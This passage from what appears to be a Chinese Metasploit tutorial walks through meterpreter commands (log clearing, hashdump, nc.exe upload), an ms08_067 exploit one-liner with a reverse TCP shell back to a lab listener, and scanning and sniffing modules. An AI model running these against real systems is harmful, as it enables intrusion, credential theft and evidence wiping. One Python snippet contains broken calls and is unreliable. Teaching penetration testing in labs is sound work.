class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令                     描述</span></span><br><span class="line"><span class="code">    -------                   -----------</span></span><br><span class="line"><span class="code">    ?                         帮助菜单</span></span><br><span class="line"><span class="code">    background                背景当前会话</span></span><br><span class="line"><span class="code">    bgkill                    杀死一个背景meterpreter脚本</span></span><br><span class="line"><span class="code">    bglist                    列出运行后台脚本</span></span><br><span class="line"><span class="code">    bgrun                     执行一个meterpreter脚本作为后台线程</span></span><br><span class="line"><span class="code">    channel                   显示信息或控制活动频道</span></span><br><span class="line"><span class="code">    close                     关闭频道</span></span><br><span class="line"><span class="code">    disable_unicode_encoding  禁用unicode字符串的编码</span></span><br><span class="line"><span class="code">    enable_unicode_encoding   启用unicode字符串的编码</span></span><br><span class="line"><span class="code">    exit                      终止meterpreter会话</span></span><br><span class="line"><span class="code">    get_timeouts              获取当前会话超时值</span></span><br><span class="line"><span class="code">    guid                      获取会话GUID</span></span><br><span class="line"><span class="code">    help                      帮助菜单</span></span><br><span class="line"><span class="code">    info                      显示有关Post模块的信息</span></span><br><span class="line"><span class="code">    irb                       进入irb脚本模式</span></span><br><span class="line"><span class="code">    load                      加载一个或多个meterpreter扩展</span></span><br><span class="line"><span class="code">    machine_id                获取连接到会话的计算机的MSF ID</span></span><br><span class="line"><span class="code">    migrate                   将服务器迁移到另一个进程</span></span><br><span class="line"><span class="code">    pivot                     管理数据透视监听器</span></span><br><span class="line"><span class="code">    quit                      终止meterpreter会话</span></span><br><span class="line"><span class="code">    read                      从频道读取数据</span></span><br><span class="line"><span class="code">    resource                  运行存储在文件中的命令</span></span><br><span class="line"><span class="code">    run                       执行meterpreter脚本或Post模块</span></span><br><span class="line"><span class="code">    sessions                  快速切换到另一个会话</span></span><br><span class="line"><span class="code">    set_timeouts              设置当前会话超时值</span></span><br><span class="line"><span class="code">    sleep                     Force Meterpreter安静，然后重新建立会话。</span></span><br><span class="line"><span class="code">    transport                 更改当前的传输机制</span></span><br><span class="line"><span class="code">    use                       不推荐使用“加载”别名</span></span><br><span class="line"><span class="code">    uuid                      获取当前会话的UUID</span></span><br><span class="line"><span class="code">    write                     将数据写入通道</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 文件系统命令</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    cat           将文件的内容读取到屏幕上</span></span><br><span class="line"><span class="code">    cd            更改目录</span></span><br><span class="line"><span class="code">    checksum      检索文件的校验和</span></span><br><span class="line"><span class="code">    cp            将源复制到目标</span></span><br><span class="line"><span class="code">    dir           列表文件（ls的别名）</span></span><br><span class="line"><span class="code">    download      下载文件或目录</span></span><br><span class="line"><span class="code">    edit          编辑一个文件</span></span><br><span class="line"><span class="code">    getlwd        打印本地工作目录</span></span><br><span class="line"><span class="code">    getwd         打印工作目录</span></span><br><span class="line"><span class="code">    lcd           更改本地工作目录</span></span><br><span class="line"><span class="code">    lls           列出本地文件</span></span><br><span class="line"><span class="code">    lpwd          打印本地工作目录</span></span><br><span class="line"><span class="code">    ls            列出文件</span></span><br><span class="line"><span class="code">    mkdir         建立目录</span></span><br><span class="line"><span class="code">    mv            将源移到目标</span></span><br><span class="line"><span class="code">    pwd           打印工作目录</span></span><br><span class="line"><span class="code">    rm            删除指定的文件</span></span><br><span class="line"><span class="code">    rmdir         删除目录</span></span><br><span class="line"><span class="code">    search        搜索文件</span></span><br><span class="line"><span class="code">    show_mount    列出所有安装点/逻辑驱动器</span></span><br><span class="line"><span class="code">    upload        上传文件或目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 网络命令</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    arp           显示主机ARP缓存</span></span><br><span class="line"><span class="code">    getproxy      显示当前的代理配置</span></span><br><span class="line"><span class="code">    ifconfig      显示界面</span></span><br><span class="line"><span class="code">    ipconfig      显示界面</span></span><br><span class="line"><span class="code">    netstat       显示网络连接</span></span><br><span class="line"><span class="code">    portfwd       将本地端口转发到远程服务</span></span><br><span class="line"><span class="code">    resolve       解析目标上的一组主机名</span></span><br><span class="line"><span class="code">    route         查看和修改路由表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 系统命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    clearev       清除事件日志</span></span><br><span class="line"><span class="code">    drop_token    放弃任何活动的模拟令牌。</span></span><br><span class="line"><span class="code">    execute       执行一个命令</span></span><br><span class="line"><span class="code">    getenv        获取一个或多个环境变量值</span></span><br><span class="line"><span class="code">    getpid        获取当前的进程标识符</span></span><br><span class="line"><span class="code">    getprivs      尝试启用当前进程可用的所有权限</span></span><br><span class="line"><span class="code">    getsid        获取运行服务器的用户的SID</span></span><br><span class="line"><span class="code">    getuid        获取服务器正在运行的用户</span></span><br><span class="line"><span class="code">    kill          终止一个过程</span></span><br><span class="line"><span class="code">    localtime     显示目标系统的本地日期和时间</span></span><br><span class="line"><span class="code">    pgrep         按名称过滤进程</span></span><br><span class="line"><span class="code">    pkill         按名称终止进程</span></span><br><span class="line"><span class="code">    ps            列出运行的进程</span></span><br><span class="line"><span class="code">    reboot        重新启动远程计算机</span></span><br><span class="line"><span class="code">    reg           修改远程注册表并与之交互</span></span><br><span class="line"><span class="code">    rev2self      在远程机器上调用RevertToSelf（）</span></span><br><span class="line"><span class="code">    shell         放入系统命令外壳</span></span><br><span class="line"><span class="code">    shutdown      关闭远程计算机</span></span><br><span class="line"><span class="code">    steal_token   尝试从目标进程中盗取模拟令牌</span></span><br><span class="line"><span class="code">    suspend       暂停或恢复进程列表</span></span><br><span class="line"><span class="code">    sysinfo       获取有关远程系统的信息，例如OS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 用户界面命令</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    enumdesktops   列出所有可访问的桌面和窗口工作站</span></span><br><span class="line"><span class="code">    getdesktop     获取当前meterpreter桌面</span></span><br><span class="line"><span class="code">    idletime       返回远程用户闲置的秒数</span></span><br><span class="line"><span class="code">    keyscan_dump   转储按键缓冲区</span></span><br><span class="line"><span class="code">    keyscan_start  开始捕捉击键</span></span><br><span class="line"><span class="code">    keyscan_stop   停止捕获击键</span></span><br><span class="line"><span class="code">    screenshot     获取交互式桌面的屏幕截图</span></span><br><span class="line"><span class="code">    setdesktop     更改meterpreters当前桌面</span></span><br><span class="line"><span class="code">    uictl          控制一些用户界面组件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam 命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    record_mic     从默认麦克风录制音频X秒</span></span><br><span class="line"><span class="code">    webcam_chat    开始视频聊天</span></span><br><span class="line"><span class="code">    webcam_list    列出网络摄像头</span></span><br><span class="line"><span class="code">    webcam_snap    从指定的摄像头拍摄快照</span></span><br><span class="line"><span class="code">    webcam_stream  从指定的摄像头播放视频流</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    getsystem     尝试将您的特权提升为本地系统的特权。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: 密码数据库命令</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    hashdump      转储SAM数据库的内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestomp 命令</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    timestomp     操纵文件MACE属性</span></span><br></pre></td></tr></table></figure><ul><li>使用</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; execute -f cmd.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; clearev   # 清除日志</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -l</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; hashdump  # 读取密码</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; run post/windows/gather/hashdump  # 读取密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; shell</span></span><br></pre></td></tr></table></figure><p><img src="lJasRoT.png" alt="img"></p><h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul><li>2015 年11月份，来自社区贡献</li><li>无需运行环境，在客户端运行原生 python 代码</li><li>使用</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load <span class="keyword">python</span></span><br><span class="line">meterpreter &gt; python_execute <span class="string">"print ('asdasdas')"</span></span><br><span class="line">meterpreter &gt; python_execute <span class="string">"import os; cd = os.getcwd()"</span> -r <span class="keyword">cd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~# <span class="keyword">cat</span> find2.<span class="keyword">py</span> </span><br><span class="line">import os</span><br><span class="line"><span class="keyword">for</span> root,dirs,<span class="keyword">files</span> in os.walk(<span class="keyword">c</span>://*):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">file</span> in <span class="keyword">file</span><span class="variable">s:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">file</span>.endwith(<span class="string">".ini"</span> ) <span class="built_in">and</span> <span class="keyword">file</span>.startwith(<span class="string">"win"</span>):</span><br><span class="line">            <span class="keyword">print</span>(os.path.john(root,<span class="keyword">file</span>))</span><br><span class="line">python_import -<span class="keyword">f</span> <span class="keyword">find</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul><li>2015 年6月已经被取消</li><li>由 msfconsole -x 取代</li><li>编写脚本时便于引用</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x "<span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi; <span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span>; <span class="keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>; <span class="keyword">set</span> LPORT <span class="number">5555</span>; <span class="keyword">set</span> target <span class="number">34</span>; exploit"</span><br></pre></td></tr></table></figure><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul><li>信息收集的模块都在 auxiliary/scanner/ 之下</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">msf</span> &gt; <span class="selector-tag">use</span> <span class="selector-tag">auxiliary</span>/<span class="selector-tag">scanner</span>/ <span class="selector-attr">[TAB]</span></span><br><span class="line"><span class="selector-tag">Display</span> <span class="keyword">all</span> <span class="selector-tag">531</span> <span class="selector-tag">possibilities</span>? (y or n)</span><br></pre></td></tr></table></figure><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul><li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap -sV <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><ul><li>auxiliary 目录下</li><li>RHOSTS &lt;&gt; RHOST<ul><li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li><li>也可以编写地址列表：file:/root/h.txt</li></ul></li></ul><h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul><li>use auxiliary/scanner/discovery/arp_sweep</li><li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search arp</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; show options </span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.0/24</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span> THREADS 20</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; run</span><br></pre></td></tr></table></figure><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul><li>use auxiliary/scanner/portscan/syn</li><li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; show options </span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> PORTS 80</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.0/24</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> THREADS 50</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; run</span><br></pre></td></tr></table></figure><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul><li>查找 ipidseq 主机（查找僵尸机）<ul><li>use auxiliary/scanner/ip/ipidseq</li><li>set RHOSTS 192.168.1.0/24 ；run</li><li>nmap -PN -sI 10.10.10.147 10.10.10.132</li></ul></li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq</span><br><span class="line">msf auxiliary(scanner/ip/ipidseq) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/ip/ipidseq) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ip/<span class="comment">ipidseq) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ip/<span class="comment">ipidseq) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap -PN -sI <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul><li>use auxiliary/scanner/discovery/udp_sweep</li><li>use auxiliary/scanner/discovery/udp_probe</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_sweep) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; set CHOST 10.10.10.131</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; run</span></span><br></pre></td></tr></table></figure><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul><li>use auxiliary/sniffer/psnuffle</li><li>支持从 pacap 抓包文件中提取密码</li><li>功能类似于 dsniff</li><li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search sniffer</span><br><span class="line">msf &gt; use auxiliary/sniffer/psnuffle</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show options </span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# ftp <span class="number">10.10</span><span class="number">.10</span><span class="number">.148</span></span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show <span class="keyword">options</span></span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; <span class="keyword">set</span> PCAPFILE /root/<span class="comment">ftp.pcapng</span></span><br><span class="line">msf <span class="comment">auxiliary(sniffer</span>/psnuffle) &gt; jobs</span><br><span class="line">msf auxiliary(sniffer/<span class="comment">psnuffle) &gt; kill 0</span></span><br><span class="line">msf <span class="comment">auxiliary(sniffer</span>/psnuffle) &gt; run</span><br></pre></td></tr></table></figure><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul><li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li><li>use auxiliary/scanner/snmp/snmp_login</li><li>use auxiliary/scanner/snmp/snmp_enum</li><li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li><li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.149</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_login) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_login) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.149</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_enum) &gt; run</span></span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142 （windows）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin （SNMP 服务器团体名）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span> THREADS 20</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumusers</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumshares</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</span><br></pre></td></tr></table></figure><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul><li>SMB 版本扫描<ul><li>use auxiliary/scanner/smb/smb_version</li></ul></li><li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul><li>use auxiliary/scanner/smb/pipe_auditor</li></ul></li><li>扫描通过 SMB 